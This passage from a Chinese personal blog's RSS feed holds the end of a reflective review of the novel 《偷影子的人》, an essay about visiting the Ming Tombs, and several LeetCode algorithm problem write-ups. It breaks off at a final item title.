这是他的倾听者，在这位忘年之交面前，他可以说出很多东西：对欺凌自己的马格的不满、对女生伊丽莎白的暗恋，大概除了自己“偷影子”的能力，其他的都是可以说的。伊凡在小男孩的童年里或多或少地扮演了一些父亲的角色，他具有生活的经验，是一个稳重的人。小男孩对伊凡的感情是珍惜，但并非对父亲那样的依赖。
学校的煤气炉爆炸了，伊凡的影子活了起来，小男孩循着他的影子救了伊凡一条命。
伊凡最珍惜的纪念册被烧了，小男孩从他的影子中得知了伊凡妈妈的事情。
一位挚爱着自己腹中孩子的母亲，会对自己的孩子说些什么呢？小男孩让他的妈妈写下了这样一封特殊的信，他想弥补伊凡的缺憾。
伊凡走了，为着自己未曾见面的母亲，他希望去践行全天下母亲的心愿：自己的孩子能过上幸福的生活。伊凡，辛苦了一生，遗憾了一生，日复一日的警卫工作磨灭了生命的热情，他本来将要迎来并送走一届又一届的小男孩，但是在最终，他的影子和一个“偷影子的人”给他带来了此生的意义。
小男孩的第二个朋友是面包师家的吕克。
这是他的同龄人，是他一生的好友，是他迷茫时候的明灯。
吕克的梦想是什么呢？继承家业，做一个出色的面包师傅吗？不，受限于家庭的经济条件，吕克是无法去追求他的医学生梦想的，只能在小镇上，继承家业，做一个出色的面包师傅。
吕克的影子和一个“偷影子的人”给他带来了逐梦的机会。吕克的父亲不爱自己的孩子吗？自己的家庭条件，让孩子去攻读医学是多么的奢侈！如果没有那个偷影子的人，这位面包师傅本来已经做好了让孩子、也让自己在遗憾中度过余生的打算；在那晚，偷影子的人来找自己，无需多言，希望自己给吕克一个实现梦想的机会。实现孩子的梦想，对自己的家庭来说是何其困难啊！一个强壮的面包师傅，在作坊前的长椅上哭得无比伤心。
吕克终究是得到了逐梦的机会。梦想和现实的对比是多么强烈，复杂无趣的功课是每个人都能承受的吗？或者外科急诊的血肉模糊的伤员，解剖台那令人发怵的躯体，昼夜颠倒的工时？吕克很幸运，他的父亲不再逼迫他成为一名面包师，让他出来追求自己的梦想；而他认清了自我，知道了自己最终的梦想是当一位不用见血、不用旁观别人的死别就能为人们带来温饱和幸福的面包师傅。
渡人亦是渡己，小男孩从这两份真挚的友情中收获了内心的清明。如果没有伊凡，童年时郁结于心的忧愁如何开解呢？如果没有吕克，就没有成年之后的对童年旧情的勇敢追求。
爱情 一个孩子，是懂得爱情的吗？
小男孩起初是不懂的，对伊丽莎白的朦朦胧胧的好感，只能归结于对美的天然追求。但是很快他就意识到，唯其萦绕于心，经久不忘，别来怅然，方可称为爱情。
小男孩是懂得爱情的。
克蕾儿是一个多么值得爱的女孩啊！她和偷影子的人是多么合适的伴侣啊！
 “我不知道对我来说哪一样比较痛苦，是从背后传来的讪笑，或是朝我射来的轻视眼光。谁会愿意爱上一个无法言语的女孩，一个笑时会发出嘶哑叫声的女孩？谁能在我害怕时给我安全感？我真的很害怕，我什么都听不到，包括脑海中的声音。我害怕长大，我很孤单，我的白昼如同无止境的黑夜，而我如同行尸走肉一般穿越其中。”
世上没有任何一个女孩敢对一个刚认识的男孩说出同样的话。这些话并非由克蕾儿的口中发出，而是她的影子在沙滩上低低地向我诉说，我终于明白了为何之前影子会向我求救。
“克蕾儿，你要知道，对我来说，你是全世界最美丽的女孩，是那种可以用嘶哑叫声擦去天空的阴暗、有着大提琴音色般的女孩。你要知道，全世界没有一个女孩可以像你一样让风筝快速旋转。
“这些话，我只敢悄悄在你背后喃喃地说，不敢让你听到。一面对你，我就成了哑巴。”
 自第一次分别之后，十余年间两人不曾再见。小男孩吻了伊丽莎白，隔天便分手了；读医学生时认识了苏菲，从友情升格为爱情之后，爱情的光终究黯淡褪色。小男孩没有得到幸福，直到他再次回到与克蕾儿相见的海滩，回到两人秘密的灯塔里。
 我等了你四个夏天，你没有信守承诺，你再也没有回来。风筝死了，我将它埋葬在这里，谁知道呢，也许有一天你会找到它。
署名：克蕾儿
  我的夏日知己变得如何了呢？那个因为听不到声音，而让我可以毫不畏惧地向她倾诉所有秘密的小女孩啊！
我闭上眼睛，我们曾经跑得上气不接下气，被带路的老鹰风筝拖着跑，你放风筝的功力无人能及，常常会有路上的行人停下脚步，只为欣赏你灵活的技巧。曾经有多少次，我牵着你的手走到这相同之地？你现在怎样了？你如今身在何方？你又会在哪个沙滩度过每个夏天？
 何其的凄美啊！遗憾总是贯穿所有人的人生，童年最炽热的感情被时间尘封，最终掩盖记忆的尘埃却被一些偶然的事情所拂去，于是这从未熄灭的感情就无比猛烈地迸发出来了。
结局是很美好的，小男孩找到了克蕾儿的住所，用一种浪漫的方式表达出自己迟到的歉意：
 此日清晨，我回到原地，早晨和煦的风微微吹拂，我带来了我的风筝。才刚展开，“老鹰”的双翼就鼓了起来，然后快速飞起。几个行人饶有兴味地停下脚步观看，然后才继续赶路。修补过的老鹰风筝沿着建筑物正面攀爬而上，还在四楼的窗户前旋转了几圈。
当克蕾儿注意到风筝时，她正在厨房泡茶，她简直不敢相信自己的眼睛，吓得把手上的早餐杯摔碎在地砖上。
几分钟过后，大楼的门打开，克蕾儿朝我冲了过来。她目不转睛地盯着我，对着我微笑，把手放进我的手里，不是为了握我的手，而是要抓住风筝的手柄。
在城市的天空里，她用纸老鹰画出大大的S和无数个完美的8。克蕾儿向来擅长在空中写诗，当我终于看懂她写的句子时，我读出：”我想你。”
一个会用风筝向你写出“我想你”的女孩啊，真让人永远都忘不了她。
 这部作品以爱情这条线作为全书的结尾，我在两年之前初读此书，颇觉意犹未尽。再读之下，我认为这条主线是有缺憾的。为什么自第一次分别之后，四年间再没有机会回去呢？小男孩的妈妈是工作繁重的护士，但是对于小男孩是关爱的，四年暑期全然地没有机会回到海滩边是不合理的。长大后第一次见到克蕾儿，演出之后她身边的男伴是谁呢？两人最终相认之后，三者的感情要如何延续呢？克蕾儿和男伴一同离去时，她的笑声已经没有了大提琴的音色，这意味着什么？我认为，这些细节我是没有读透的，作者给我们留下的空间太多了，总是有一些很美好和一些很不美好的想象在我们心头萦绕，这样的体会见仁见智，于我而言是不好的。
亲情 将亲情放在最后，是因为这段感情给我最大的触动。
小男孩的爸爸在他上小学的时候离开了家庭，小男孩的妈妈成了单亲妈妈。这位妈妈真是一个无比温柔的人，总是给自己的孩子最温馨的一面，而将疲累深埋起来。在妈妈的影响下，小男孩也成长为一个温柔的人，他使用自己“偷影子”的能力帮助很多人摆脱了枷锁，这和这位伟大母亲的作用是分不开的。同时，长期与妈妈相依为命，小男孩的情感中具备很多女性的敏感和犹疑，他无法把握自己友情和爱情的界限，因此伤害了无辜的苏菲。
在小男孩离家求学的时候，这位母亲的信是报喜不报忧的，永远不让自己的孩子操心，直到最终的离去。
小男孩对妈妈的爱从未变化过，在时光流逝中产生的思考是非常真实的：
 青少年时期，我们总梦想着离开父母的一天，而改天，却换成父母离开我们了。于是我们就只能梦想着，能否有一时片刻，重新变回寄居在父母屋檐下的孩子，能抱抱他们，不害羞地告诉他们，我们爱他们，为了能让自己安心而紧紧依偎在他们身边。
 在妈妈的葬礼之后，迎来了我最为难过的一段：
 我走到厨房，打开冰箱，看到她准备好的晚餐······
我呆若木鸡地站在敞开的冰箱前，眼泪失控地奔流而下。葬礼全程我都没有哭泣，仿佛她禁止我哭，因为她希望我不要在众人面前失态。只有碰到毫不起眼的小细节时，我们才会突然意识到，深爱的人已经不在的事实：床头桌上的闹钟仍在滴答作响，一个枕头落在凌乱的床边，一张照片立在五斗柜上，一支牙刷插在漱口杯中，一只茶壶立在厨房的窗台上，壶嘴面向窗户以便观看花园，而摆在桌上的，还有吃剩的淋了枫糖浆的苹果卡卡蛋糕。
 读完上面的句子，我的内心如受猛击，在真实世界中漂泊数年的思绪尽皆涌上心头。我们还有多少的时间来陪伴我们最爱的人们呢？亲情，无比浓烈而终将消散，命运已经注定了养你长大的人将离你而去。如若我亲临上面句子中的情境，内心将会是何等的悲痛。
“悲剧就是把美好的东西打碎给人看”，再读《偷影子的人》，已不觉得它是美好的、治愈的，而是深沉的、忧伤的。友情和爱情的起伏不过是亲情主线的点缀，亲情的缺憾、补完、温馨和厚重而终至于飘散，给全文染上了最强烈的色彩。一位温柔了一辈子、爱了自己孩子一辈子的母亲，最终的愿望还是让自己的孩子追求自己想要的生活，活得健康而快乐，如此才于文末引出了对童年爱情的回溯、与克蕾儿的重逢。
在这条主线上，我现在所能表达的，大抵只有如此。这条贯穿了全文的脉络，用言语描述起来是无力的，是需要亲自去品味的。
小结 两年半前读此书，初入大学的校门。在沙河强劲的秋风中有感于爱情线的美好，颇觉本书实在温暖人心。两年间世殊时异，情随事迁，无意中再作翻阅，感慨已然不同。《偷影子的人》真是一部很好的作品，很感谢它在我浮躁、功利的生活中带给我一天多的专心阅读的时光，我的影子被偷走了，融入了书中的世界，它又回来了，留给我萦绕不散的万千思绪。
总结性的笔记只是我阅读此书时诸多思考中的一点，书中所刻画的如马格、苏菲等人物仅仅简单地提及，但对于整个故事的作用是不可忽视的。我将这本书的电子版本留在此处，希望有缘读到它的人能了解到这个故事的全部、从这部优秀的作品中产生一些思考。如此举侵犯版权，请及时联系我删除。
 《偷影子的人》（mobi格式）</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode220. 存在重复元素 III</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode220.-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-iii/</link>
      <pubDate>Sun, 18 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode220.-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-iii/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/contains-duplicate-iii/
这是个中等题？
题目  给你一个整数数组 nums 和两个整数 k 和 t 。请你判断是否存在 两个不同下标 i 和 j，使得 abs(nums[i] - nums[j]) &amp;lt;= t ，同时又满足 abs(i - j) &amp;lt;= k 。
如果存在则返回 true，不存在返回 false。
示例1
 输入： nums = [1,2,3,1], k = 3, t = 0 输出： true  示例2
 输入： nums = [1,5,9,1,5,9], k = 2, t = 3 输出： false  数据范围
 0 &amp;lt;= nums.length &amp;lt;= 2 * 104 -231 &amp;lt;= nums[i] &amp;lt;= 231 - 1 0 &amp;lt;= k &amp;lt;= 104 0 &amp;lt;= t &amp;lt;= 231 - 1   分析 朴素想法：遍历每个满足条件的 i 、 j ，找到符合条件的就退出。</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode208. 实现 Trie (前缀树)</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode208.-%E5%AE%9E%E7%8E%B0-trie-%E5%89%8D%E7%BC%80%E6%A0%91/</link>
      <pubDate>Wed, 14 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode208.-%E5%AE%9E%E7%8E%B0-trie-%E5%89%8D%E7%BC%80%E6%A0%91/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/implement-trie-prefix-tree/
定场句：人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。
题目  Trie（发音类似 &amp;ldquo;try&amp;rdquo;）或者说 前缀树 是一种树形数据结构，用于高效地存储和检索字符串数据集中的键。这一数据结构有相当多的应用情景，例如自动补完和拼写检查。
请你实现 Trie 类：
  Trie() 初始化前缀树对象。
  void insert(String word) 向前缀树中插入字符串 word 。
  boolean search(String word) 如果字符串 word 在前缀树中，返回 true（即，在检索之前已经插入）；否则，返回 false 。
  boolean startsWith(String prefix) 如果之前已经插入的字符串 word 的前缀之一为 prefix ，返回 true ；否则，返回 false 。
  示例
  输入：
[&amp;ldquo;Trie&amp;rdquo;, &amp;ldquo;insert&amp;rdquo;, &amp;ldquo;search&amp;rdquo;, &amp;ldquo;search&amp;rdquo;, &amp;ldquo;startsWith&amp;rdquo;, &amp;ldquo;insert&amp;rdquo;, &amp;ldquo;search&amp;rdquo;]
[[], [&amp;ldquo;apple&amp;rdquo;], [&amp;ldquo;apple&amp;rdquo;], [&amp;ldquo;app&amp;rdquo;], [&amp;ldquo;app&amp;rdquo;], [&amp;ldquo;app&amp;rdquo;], [&amp;ldquo;app&amp;rdquo;]]
  输出：</description>
    </item>
    
    <item>
      <title>错题本 | LeetCode80. 删除有序数组中的重复项 II</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode80.-%E5%88%A0%E9%99%A4%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9-ii/</link>
      <pubDate>Tue, 06 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode80.-%E5%88%A0%E9%99%A4%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9-ii/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/
题目  给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 最多出现两次 ，返回删除后数组的新长度。
不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。
示例1
 输入： nums = [1,1,1,2,2,3] 输出： 5, nums = [1,1,2,2,3] 解释： 函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。 不需要考虑数组中超出新长度后面的元素。  示例2
 输入： nums = [0,0,1,1,1,1,2,3,3] 输出： 7, nums = [0,0,1,1,2,3,3]  数据范围
 1 &amp;lt;= nums.length &amp;lt;= 3 * 104 -104 &amp;lt;= nums[i] &amp;lt;= 104 nums 已按升序排列   分析 更新博客主题第一篇~ 分析部分不用 &amp;gt; 包起来了 ヽ(￣▽￣)ﾉ</description>
    </item>
    
    <item>
      <title>游明十三陵记</title>
      <link>https://xrg.fj.cn/p/%E6%B8%B8%E6%98%8E%E5%8D%81%E4%B8%89%E9%99%B5%E8%AE%B0/</link>
      <pubDate>Sun, 04 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E6%B8%B8%E6%98%8E%E5%8D%81%E4%B8%89%E9%99%B5%E8%AE%B0/</guid>
      <description>前奏 上周便计划着利用清明假期出门游玩，而一周劳累之后，游兴顿起，再难收拾。昨天到了约好的时间，舍友却没办法从床上起来，我无心再作拖延，独自一人踏上了去往明十三陵的路程。
此前并未做详细的路线调研，只觉得既然昌平线上有十三陵站，总不会骗我才是。在十三陵站下车，走出站门赫然是一片荒芜闭塞的小地方。十三陵，到现在还是切切实实的郊区。我对北方农村一直以来的热情在此刻也被一并激发出来，便无视了地铁站口那许多的揽客司机，独自向着十三陵的方向走去。
天气实在太好了。晴空万里无一物，吹面不寒杨柳风。北方的春天与南方大不相同，经历了无比残酷的严寒之后，这个世界开始倾其所有温柔来哺育万物。北方的农村也与南方大不相同，它给我的感觉是更为开阔、更为肃穆，杨柳的阴影在老屋的硬山顶上流动，破碎的石板路和宽阔的柏油路交替述说着这一片村落的兴衰。我的家乡——闽南的村落我是很喜欢的，大抵由于宗法的盛行，邻舍之间的布局更加的紧密，总是给人一种热闹而团结的氛围，但从气质而言，则稍逊于此处了。
沿着涧头村的村道走着，走上了昌赤路，十三陵的地界已然在我的正前方了。一路走过，所遇到的骑行者不可胜数，颇觉首都的文体活动确实是非常发达，不禁羡慕起了生长于此地的人们，在他们最美好的年华里，每年都能在这么舒爽的春气中驰骋在平整的乡道上，探访那些历史悠久的地方。
沿着昌赤路直行数十分钟，到达了大宫门附近。在路边的农家餐馆中随便应付，稍作歇息便开启了游览十三陵的进程。大宫门本是神道的入口，却由于景区的施工而暂时封闭。我只得重新回到马路，继续朝着神道的方向走去。
神道 神道是帝王和百官前往祭祀的起点，他们总要在这么一条长而不单调的道路上行进着，酝酿出对先祖的无比真挚的敬意来。
从入门开始便显出了庄重。倘若帝王也于清明来祭拜祖先，则我们看到的景象是一样的：迈过了门槛，走出深厚而低矮的门，便是天地开阔、杨柳轻舞、石像规整、地砖严密的神道。古人确乎是事死如生，先帝所喜闻乐见的瑞兽、诤臣，也都要化作了石像，在这条长长直直的神道上永久地陪伴着他们的魂灵。凡此一类表征性的东西，是否能使先帝安息倒是还不可知，能使后来的拜祭者产生出自足而凝重的情绪恐怕是一定的了。
也许在几百年前的某个清明，某位帝王就这么静默地走在这条神道上，追思先帝的种种，也冥想着关于天下百姓的种种。
亦也许在几百年前的某个清明，某位帝王带着他的妃嫔，脚步轻快地在这里前行，赶紧完成了祭祀，还有盛大的宴会在等着他呢。
定陵 从神道出去，距离真正的陵寝还有很远的距离。我在昌赤路上继续行进了几百米，打开地图一看，恐怕几公里的路程用脚走下来，时间的花费是吃不消的了。在昌平胡庄站上了公交，在拥挤的道路上走走停停，总算是来到了定陵。
定陵是万历皇帝的陵寝，一位几十年不上朝的皇帝，对于自己身后的住所倒是非常上心。宫殿的规制还是很严格的，从入门开始，过祾恩门、祾恩殿（均被焚毁），来到棂星门和明楼。明楼脚下的两个偏殿中正在展出定陵地宫出土的文物，我在展厅内融入了一个导游团，听导游讲解定陵的故事。
建国初期，考古专家们本欲发掘长陵（永乐皇帝朱棣的陵寝），但帝陵规制巨大，长陵又是其中最大，专家中没有一人有过发掘此类陵寝的经验。经过探讨，最终决定发掘规制较小的定陵，为长陵的发掘积攒经验。在发掘初期，专家在一条探沟中找到了明楼侧面的地下隧道，沿着此隧道的走向挖掘第二条探沟；在第二道探沟处找到了一块指路石碑，根据石碑的记载深挖第三道探沟，找到了地宫的大门。进入地宫，其大门竟是从内部顶住的，专家吓了一跳，认为这说明了当时有活人殉葬——活人从内部将大门锁上之后，在地宫中自决。然而史料记载在万历之前很久就已经废除了活人殉葬的制度，故此内部的门封，应是用了某些物理的办法来实现。打开地宫，果真干干净净，没有尸骨。他们逐步向内发掘，见到了万历皇帝宝座、孝端皇后宝座和孝靖皇后宝座；后殿是三具棺椁，左偏殿是一块石台，当中一处长方形开口，是为金井，乃是整座左偏殿的风水穴眼。后殿的金井正在万历皇帝棺椁下方，故无法目睹；如此穴眼是地宫建筑的中心，是风水最为关键的地方，古人相信，这类穴眼能使得帝王死后的元气继续护佑子孙万世。
我们是从左偏殿进入地宫的，先瞧了瞧金井，后进入正殿看了宝座，后见了三具棺椁，最后从第三道探沟中经过地宫大门而出。地宫有一千多平方米，加上先前的许多建筑，可算得是一项很大的工程了。帝王将棺椁置于金井之上，希望自己的龙气荫及子孙，永保江山，而不知自己的一座陵寝使得子民付出了多少，使得国家付出了多少。十三座气势磅礴的陵寝，是十三个朝代人民的血汗和牺牲；皇家的金井玄学，只是希望皇权永固，而非希望子民安乐。或不如说，从帝王的生前到身后，整个无比高级、无比精细的礼制体系，本就建立在人民的付出之上，基于压榨人民的江山永固的愿望，本身就无法实现，江山是不可避免地会丢掉的。
很有趣的是，地宫中三座宝座的面前都摆着一个青花瓷缸，内部原本是盛满了灯油，点着长明灯的。那微弱的火焰自然无法在这地下27米的地方长明，历经几百年的黑暗，后人在这里扯上了电线，点亮了电灯，一切清晰如昼，地宫算是真正地明亮了起来。
从地宫的正门上明楼，这是一座完全用石质材料的建筑，故而未受战火的侵蚀。紫禁城用木质，陵寝明楼用石质，似乎相比于振兴民族、不朽于史册，还是自己陵寝的不朽更为重要一些。
在明楼见到了一块巨大的石碑，相当于是墓碑了，上书：大明神宗显皇帝之陵。在明楼上，视野极开阔，在此前所提到的绝好天气里，江山真是无比多娇。我想，帝王死后有灵，从地宫出来在这明楼上看看，现今的景象大抵是不会令其失望的。然而，亦是同样的视角，恐怕也能见到农民的起义、外寇的入侵、人民的自主、新中国的旧貌新颜。中国人在这样的历史发展中站了起来，而幻想着江山永固的帝王恐怕就不会那么高兴了。
长陵 从定陵出来，还得再乘十来分钟的公交车才能到达长陵。相较于定陵，长陵的规制更为宏大。战火并未使此地受损，我由此得以见到祾恩门、祾恩殿的样子。
大抵可以将祾恩门、祾恩殿看作是太和门、太和殿，是皇帝于另一个世界上朝的地方。经典的重檐庑殿顶，檐角九走兽，无一不在显示皇权的威严。祾恩殿中立着一座很高的朱棣坐像，殿内展出的是定陵出土的文物（仿品），也没有什么好讲。我在这里又融入了第二个导游团，始觉得游览时有一个好导游是能学到很多的。
出祾恩殿，来到棂星门和明楼。定陵发掘之后效果并不非常理想，由于长陵规制更为宏大，国家禁止了对帝陵的发掘。故长陵没有地宫可以参观，我们上明楼，在导游的讲解下才觉察到此处的玄妙所在。
从长陵明楼望去，正面远处是昌平凤山，左面是莽山，右面是虎峪，后面是玄武山；四象齐聚，风水之祥瑞可见一斑。长陵是十三陵中的祖陵，风水尤佳，除了四象之外，多处水流汇集于此，取传统的“流水聚财”之意。依据风水，坐西北朝东南才是最佳的卦位，长陵朝向偏离南北九度，紫禁城朝向偏离南北六度，皆出于此。
与定陵类似，长陵也有一块石碑，上书：大明成祖文皇帝之陵。“成祖”是庙号，有功称为祖，有德称为宗，原本朱棣的庙号为高宗，后世一位皇帝（记不清了）认为朱元璋开创大明基业有功，而朱棣稳固大明基业有功，亦可称之为“祖”，于是，大明成为历史上同时具备“明高祖”和“明成祖”两位祖的王朝。
当时改宗为祖，石碑并未重新建造，而是在原本的石碑之外套上一层木质外壳。在嘉靖年间，一道天雷击中此处，木石俱毁。皇帝本身也是一位无功无德的人，认为是上天发怒，怪罪于己；此时一位大臣说：此前改宗为祖，并未重修石碑，今日天雷毁之，乃是令我们重修石碑之意，皇帝大喜，遂重修石碑，就是现今的这一块。
长陵的石碑立此也几百年了，我对于这座明楼的想法，与定陵无异。从长陵出来时，导游跟游客打趣说：长陵风水最佳，而后逐个逐个的陵寝风水就渐渐差了，故大明国势也逐渐衰微。我想这确实有趣，但恐怕无理，哪有祖宗陵墓不占据上佳风水，而将之留给后世的道理呢？且若如此，则长陵占个风水最差的地方，后面的陵寝去寻更好的风水，则国运日强，统治延绵；每朝都如此做，中国岂有如此多的风水上佳之地？最终恐怕还是上升到了极限，要渐渐落下的。
实际上我来教帝王选风水罢，世上本无绝佳的风水，人民就是最好的风水。</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode90. 子集 II</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode90.-%E5%AD%90%E9%9B%86-ii/</link>
      <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode90.-%E5%AD%90%E9%9B%86-ii/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/subsets-ii/
题目 给你一个整数数组 nums ，其中可能包含重复元素，请你返回该数组所有可能的子集（幂集）。
解集 不能 包含重复的子集。返回的解集中，子集可以按 任意顺序 排列。
示例1
  输入： nums = [1,2,2]
  输出： [[],[1],[1,2],[1,2,2],[2],[2,2]]
  示例2
  输入： nums = [0]
  输出： [[],[0]]
  分析  三个月之前WA过的题，在每日一题里碰见了，而我还是思考了很久 :cry:
 原始数组中可能包含重复元素，则对于重复元素的考虑就尤为重要，一般来说，重复元素对于子集的贡献也有重复。
我们不妨考虑进行以下的模拟，对于一个 不包含重复元素 的集合 [1, 2, 3] ，如何求得它的所有子集呢？
首先，答案中包含一个空集。
首先取得第一个元素，将其与当前答案中的所有集合拼接，放入答案中；
考虑第二个元素，将其与当前答案中的所有集合拼接，放入答案中；
第三个元素同理。
示意
在这个环节中，由于答案是在不断地增长的，我们只需要用一个变量保存添加元素之前的答案集合大小即可。
这种做法的正确性是 不会证明 理所当然的。
实际上，根据这种做法我们可以AC掉 LeetCode78. 子集 。
// LeetCode 78 class Solution { public: vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; subsets(vector&amp;lt;int&amp;gt;&amp;amp; nums) { vector&amp;lt;int&amp;gt; tmp; vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res; res.</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode190. 颠倒二进制位</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode190.-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/</link>
      <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode190.-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/reverse-bits/
一道简单题，却能引出一个无比骚包的操作。此法前所未见，独自亦难想出，因此大抵也算是难的。
题目  颠倒给定的 32 位无符号整数的二进制位。
示例1
  输入： 00000010100101000001111010011100
  输出： 00111001011110000010100101000000
  解释： 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。
  示例2
 输入： 11111111111111111111111111111101 输出： 10111111111111111111111111111111   分析  易得简单暴力的32次循环法，在此不表，详见AC代码1。唯有一点值得注意：先加最低位再将 res 移位的时候，只能移动 31 次，否则最高位将溢出。因此，AC代码1中只取31次循环，而将最后一位置于循环外。
 对于一个首尾对换的操作，我们可以使用分治的思路。
考虑对于最大的32位二进制，将前16位与后16位对换。
考虑高低的16位，将每一部分中的高8位与低8位对换。
如此进行······
分治
那么，我们如何做到这种形式的对换呢？
不妨以8位二进制为例，对于一个八位二进制数 1011 0011 ，我们首先需要将其高低四位进行对换。示意如下：
Step 1
对于一个二进制数，我们可以很简单地使用如下办法取得它的高低四位：
highBits = 0x10110011 &amp;amp; 0x11110000 = 0x10110011 &amp;amp; 0xf0</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode82. 删除排序链表中的重复元素 II</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode82.-%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-ii/</link>
      <pubDate>Thu, 25 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode82.-%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-ii/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/
题目  存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除链表中所有存在数字重复情况的节点，只保留原始链表中 没有重复出现 的数字。
返回同样按升序排列的结果链表。
示例1
  输入： head = [1,2,3,3,4,4,5]
  输出： [1,2,5]
  示例2
  输入： head = [1,1,1,2,3]
  输出： [2,3]
  数据范围
 链表中节点数目在范围 [0, 300] 内 -100 &amp;lt;= Node.val &amp;lt;= 100 题目数据保证链表已经按升序排列   分析  在 有序 的链表中去重，表示我们理论上只需要进行一次遍历即可。
而两次遍历的办法则更为简单，也是最初浮现在我脑海中的念头。考虑到链表节点的数据范围在 [-100, 100] 区间中，我们在第一次遍历的过程中记录每个数值出现的次数，而在第二次遍历过程中考虑下一个节点（的数值）是否应该存在于最终的结果中即可。
 当然，两次遍历的办法随着节点数据范围的变大很快就失效了，投机不可取，一次遍历的办法如何实现呢？
在有序的数组中取得一段相同元素的子数组，直接考虑滑动窗口。
我们使用一个指针，指向窗口 左边界的左邻居 ，使用两个指针维护窗口的左右边界。当窗口右边界数值等于左边界数值时，窗口向右扩张，否则进行一定的更新操作。
容易想象，在不发生重复的情况下，窗口的大小（right - left）始终为 1 ，而发生重复的时候整段窗口需要全部从链表上删除。
窗口中无重复</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode395. 至少有 K 个重复字符的最长子串</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode395.-%E8%87%B3%E5%B0%91%E6%9C%89-k-%E4%B8%AA%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/</link>
      <pubDate>Sat, 27 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode395.-%E8%87%B3%E5%B0%91%E6%9C%89-k-%E4%B8%AA%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/</guid>
      <description>题目链接： https://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/
题目  给你一个字符串 s 和一个整数 k ，请你找出 s 中的最长子串， 要求该子串中的每一字符出现次数都不少于 k 。返回这一子串的长度。
示例1
  输入： s = &amp;ldquo;aaabb&amp;rdquo;, k = 3
  输出： 3
  解释： 最长子串为“aaa”，其中”a“重复了3次
  示例2
  输入： s = “ababbc”, k = 2
  输出： 5
  数据范围
 1 &amp;lt;= s.length &amp;lt;= 104 s 仅由小写英文字母组成 1 &amp;lt;= k &amp;lt;= 105   分析  没有任何思路，参照题解的分治法将此题解出，稍作记录。
首先，对于 s 中的所有字符，我们可以统计它们出现的次数，对于所有出现次数小于 k 的字符，答案中一定不包含它。</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode1438. 绝对差不超过限制的最长连续子数组</title>
